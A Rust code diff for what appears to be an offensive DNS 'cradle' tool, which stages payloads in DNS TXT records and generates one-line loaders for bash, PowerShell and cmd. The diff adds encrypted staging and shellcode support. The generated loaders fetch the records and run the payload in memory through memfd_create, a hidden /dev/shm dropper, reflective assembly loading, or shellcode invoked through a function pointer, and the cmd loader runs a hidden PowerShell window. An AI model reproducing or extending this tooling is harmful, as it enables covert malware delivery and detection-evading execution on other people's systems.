@@ -17,6 +17,8 @@ pub enum CradleError {
     MetaNotFound(String),
     #[error("metadata parse error: {0}")]
     MetaParse(String),
+    #[error("crypto error: {0}")]
+    Crypto(String),
     #[error("{0}")]
     Other(String),
 }
@@ -24,14 +26,21 @@ pub enum CradleError {
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
 #[serde(rename_all = "lowercase")]
 pub enum PayloadType {
-    Script, Elf, Pe,
+    Script,
+    Elf,
+    Pe,
+    Shellcode,
 }
 
 impl PayloadType {
     pub fn detect(data: &[u8]) -> Self {
-        if data.len() >= 4 && &data[..4] == b"\x7fELF" { PayloadType::Elf }
-        else if data.len() >= 2 && &data[..2] == b"MZ" { PayloadType::Pe }
-        else { PayloadType::Script }
+        if data.len() >= 4 && &data[..4] == b"\x7fELF" {
+            PayloadType::Elf
+        } else if data.len() >= 2 && &data[..2] == b"MZ" {
+            PayloadType::Pe
+        } else {
+            PayloadType::Script
+        }
     }
 }
 
@@ -41,6 +50,7 @@ impl std::fmt::Display for PayloadType {
             PayloadType::Script => write!(f, "script"),
             PayloadType::Elf => write!(f, "elf"),
             PayloadType::Pe => write!(f, "pe"),
+            PayloadType::Shellcode => write!(f, "shellcode"),
         }
     }
 }
@@ -52,6 +62,7 @@ impl std::str::FromStr for PayloadType {
             "script" => Ok(PayloadType::Script),
             "elf" => Ok(PayloadType::Elf),
             "pe" => Ok(PayloadType::Pe),
+            "shellcode" | "sc" => Ok(PayloadType::Shellcode),
             _ => Err(format!("unknown payload type: {s}")),
         }
     }
@@ -64,14 +75,25 @@ pub struct StageMeta {
     #[serde(rename = "type")]
     pub payload_type: PayloadType,
     pub hash: String,
+    /// Whether the staged payload is encrypted (ChaCha20-Poly1305)
+    #[serde(default)]
+    pub encrypted: bool,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
-pub enum Shell { Bash, Pwsh, Cmd }
+pub enum Shell {
+    Bash,
+    Pwsh,
+    Cmd,
+}
 
 impl std::fmt::Display for Shell {
     fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        match self { Shell::Bash => write!(f, "bash"), Shell::Pwsh => write!(f, "pwsh"), Shell::Cmd => write!(f, "cmd") }
+        match self {
+            Shell::Bash => write!(f, "bash"),
+            Shell::Pwsh => write!(f, "pwsh"),
+            Shell::Cmd => write!(f, "cmd"),
+        }
     }
 }
 
@@ -99,49 +121,90 @@ fn record_prefix(label: &str, domain: &str) -> String {
     format!("_s.{label}.{domain}")
 }
 
+/// Stage a payload into DNS TXT records.
+///
+/// By default, records are plain base64 (for native-tool cradle compatibility).
+/// If `encrypt` is true, the payload is encrypted with ChaCha20-Poly1305 before
+/// base64 encoding — cradles will need the key to decode.
 pub async fn stage_payload(
-    backend: &dyn DnsBackend, domain: &str, label: &str, data: &[u8],
+    backend: &dyn DnsBackend,
+    domain: &str,
+    label: &str,
+    data: &[u8],
     payload_type: Option<PayloadType>,
+    encrypt: bool,
+    encryption_key: Option<&crate::crypto::EncryptionKey>,
 ) -> Result<StageMeta, CradleError> {
-    if data.is_empty() { return Err(CradleError::EmptyPayload(0)); }
+    if data.is_empty() {
+        return Err(CradleError::EmptyPayload(0));
+    }
 
     let ptype = payload_type.unwrap_or_else(|| PayloadType::detect(data));
     let hash = blake3::hash(data).to_hex()[..32].to_string();
 
-    let chunks: Vec<String> = data.chunks(MAX_CHUNK_RAW)
+    // Optionally encrypt the payload
+    let staged_data = if encrypt {
+        let key = encryption_key.ok_or_else(|| {
+            CradleError::Crypto("encryption requested but no key provided".to_string())
+        })?;
+        crate::crypto::encrypt(key, data)
+            .map_err(|e| CradleError::Crypto(e.to_string()))?
+    } else {
+        data.to_vec()
+    };
+
+    let chunks: Vec<String> = staged_data
+        .chunks(MAX_CHUNK_RAW)
         .map(|chunk| base64::engine::general_purpose::STANDARD.encode(chunk))
         .collect();
 
-    let meta = StageMeta { chunks: chunks.len(), size: data.len(), payload_type: ptype, hash };
+    let meta = StageMeta {
+        chunks: chunks.len(),
+        size: data.len(),
+        payload_type: ptype,
+        hash,
+        encrypted: encrypt,
+    };
 
     let meta_name = meta_record_name(label, domain);
-    let meta_json = serde_json::to_string(&meta).map_err(|e| CradleError::Other(e.to_string()))?;
-    backend.create_record(&meta_name, &meta_json, RECORD_TTL).await?;
+    let meta_json =
+        serde_json::to_string(&meta).map_err(|e| CradleError::Other(e.to_string()))?;
+    backend
+        .create_record(&meta_name, &meta_json, RECORD_TTL)
+        .await?;
 
     let mut batch: Vec<(String, String)> = Vec::with_capacity(chunks.len());
     for (i, encoded) in chunks.iter().enumerate() {
         batch.push((chunk_record_name(i, label, domain), encoded.clone()));
     }
-    let batch_refs: Vec<(&str, &str, u32)> = batch.iter()
-        .map(|(name, content)| (name.as_str(), content.as_str(), RECORD_TTL)).collect();
+    let batch_refs: Vec<(&str, &str, u32)> = batch
+        .iter()
+        .map(|(name, content)| (name.as_str(), content.as_str(), RECORD_TTL))
+        .collect();
     backend.batch_create(batch_refs).await?;
 
     Ok(meta)
 }
 
 pub async fn read_stage_meta(
-    backend: &dyn DnsBackend, domain: &str, label: &str,
+    backend: &dyn DnsBackend,
+    domain: &str,
+    label: &str,
 ) -> Result<StageMeta, CradleError> {
     let name = meta_record_name(label, domain);
     let records = backend.get_records(&name).await?;
-    let record = records.first().ok_or_else(|| CradleError::MetaNotFound(label.to_string()))?;
+    let record = records
+        .first()
+        .ok_or_else(|| CradleError::MetaNotFound(label.to_string()))?;
     let meta: StageMeta = serde_json::from_str(&record.content)
         .map_err(|e| CradleError::MetaParse(e.to_string()))?;
     Ok(meta)
 }
 
 pub async fn unstage_payload(
-    backend: &dyn DnsBackend, domain: &str, label: &str,
+    backend: &dyn DnsBackend,
+    domain: &str,
+    label: &str,
 ) -> Result<usize, CradleError> {
     let prefix = record_prefix(label, domain);
     let meta_name = meta_record_name(label, domain);
@@ -149,22 +212,35 @@ pub async fn unstage_payload(
 
     let meta_records = backend.get_records(&meta_name).await?;
     for r in &meta_records {
-        if let Some(id) = &r.id { backend.delete_record(id).await?; deleted += 1; }
+        if let Some(id) = &r.id {
+            backend.delete_record(id).await?;
+            deleted += 1;
+        }
     }
 
     let all_records = backend.list_records(&prefix).await?;
     for r in &all_records {
-        if let Some(id) = &r.id { backend.delete_record(id).await?; deleted += 1; }
+        if let Some(id) = &r.id {
+            backend.delete_record(id).await?;
+            deleted += 1;
+        }
     }
 
     Ok(deleted)
 }
 
 pub fn generate_cradle(
-    shell: Shell, domain: &str, label: &str, meta: &StageMeta, ns_server: Option<&str>,
+    shell: Shell,
+    domain: &str,
+    label: &str,
+    meta: &StageMeta,
+    ns_server: Option<&str>,
 ) -> String {
     let n = meta.chunks - 1;
-    let is_binary = matches!(meta.payload_type, PayloadType::Elf | PayloadType::Pe);
+    let is_binary = matches!(
+        meta.payload_type,
+        PayloadType::Elf | PayloadType::Pe | PayloadType::Shellcode
+    );
     match shell {
         Shell::Bash => gen_bash(domain, label, n, is_binary, ns_server),
         Shell::Pwsh => gen_pwsh(domain, label, n, is_binary, meta.payload_type, ns_server),
@@ -172,9 +248,17 @@ pub fn generate_cradle(
     }
 }
 
-fn gen_bash(domain: &str, label: &str, max_idx: usize, is_binary: bool, ns: Option<&str>) -> String {
+fn gen_bash(
+    domain: &str,
+    label: &str,
+    max_idx: usize,
+    is_binary: bool,
+    ns: Option<&str>,
+) -> String {
     let ns = ns.map(|s| format!(" @{s}")).unwrap_or_default();
-    let fetch = format!("for i in $(seq 0 {max_idx});do dig +short TXT _s.$i.{label}.{domain}{ns}|tr -d '\"';done");
+    let fetch = format!(
+        "for i in $(seq 0 {max_idx});do dig +short TXT _s.$i.{label}.{domain}{ns}|tr -d '\"';done"
+    );
 
     if is_binary {
         let memfd = format!(
@@ -182,24 +266,46 @@ fn gen_bash(domain: &str, label: &str, max_idx: usize, is_binary: bool, ns: Opti
              fd=ctypes.CDLL(None).memfd_create(b'x',1);os.write(fd,b);\
              os.execve(f'/proc/self/fd/{{fd}}',['.'],dict(os.environ))\""
         );
-        let shm = format!("{fetch}|base64 -d>/dev/shm/.x&&chmod +x /dev/shm/.x&&/dev/shm/.x;rm -f /dev/shm/.x");
+        let shm = format!(
+            "{fetch}|base64 -d>/dev/shm/.x&&chmod +x /dev/shm/.x&&/dev/shm/.x;rm -f /dev/shm/.x"
+        );
         format!("# Fileless (python3):\n{memfd}\n\n# /dev/shm fallback:\n{shm}")
     } else {
         format!("eval \"$({fetch}|base64 -d)\"")
     }
 }
 
-fn gen_pwsh(domain: &str, label: &str, max_idx: usize, is_binary: bool, ptype: PayloadType, ns: Option<&str>) -> String {
+fn gen_pwsh(
+    domain: &str,
+    label: &str,
+    max_idx: usize,
+    is_binary: bool,
+    ptype: PayloadType,
+    ns: Option<&str>,
+) -> String {
     let ns_p = ns.map(|s| format!(" -Se {s}")).unwrap_or_default();
-    let fetch = format!("-join(0..{max_idx}|%{{(Resolve-DnsName -Ty TXT -Na \"_s.$_.{label}.{domain}\"{ns_p}).Strings}})");
+    let fetch = format!(
+        "-join(0..{max_idx}|%{{(Resolve-DnsName -Ty TXT -Na \"_s.$_.{label}.{domain}\"{ns_p}).Strings}})"
+    );
 
     if is_binary {
         match ptype {
             PayloadType::Pe => format!(
-                "$b=[Convert]::FromBase64String({fetch});[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))"
+                "$b=[Convert]::FromBase64String({fetch});\
+                 [Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,@(,@()))"
+            ),
+            PayloadType::Shellcode => format!(
+                "$b=[Convert]::FromBase64String({fetch});\
+                 $m=[Runtime.InteropServices.Marshal];\
+                 $p=$m::AllocHGlobal($b.Length);\
+                 $m::Copy($b,0,$p,$b.Length);\
+                 $d=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($p,[Action]);\
+                 $d.Invoke()"
             ),
             _ => format!(
-                "$b=[Convert]::FromBase64String({fetch});$f='/dev/shm/.x';[IO.File]::WriteAllBytes($f,$b);chmod +x $f;Start-Process $f -Wait;rm $f"
+                "$b=[Convert]::FromBase64String({fetch});\
+                 $f='/dev/shm/.x';[IO.File]::WriteAllBytes($f,$b);\
+                 chmod +x $f;Start-Process $f -Wait;rm $f"
             ),
         }
     } else {
@@ -207,7 +313,14 @@ fn gen_pwsh(domain: &str, label: &str, max_idx: usize, is_binary: bool, ptype: P
     }
 }
 
-fn gen_cmd(domain: &str, label: &str, max_idx: usize, is_binary: bool, ptype: PayloadType, ns: Option<&str>) -> String {
+fn gen_cmd(
+    domain: &str,
+    label: &str,
+    max_idx: usize,
+    is_binary: bool,
+    ptype: PayloadType,
+    ns: Option<&str>,
+) -> String {
     let inner = gen_pwsh(domain, label, max_idx, is_binary, ptype, ns);
     let escaped = inner.replace('"', "\\\"");
     format!("powershell -nop -w hidden -c \"{escaped}\"")
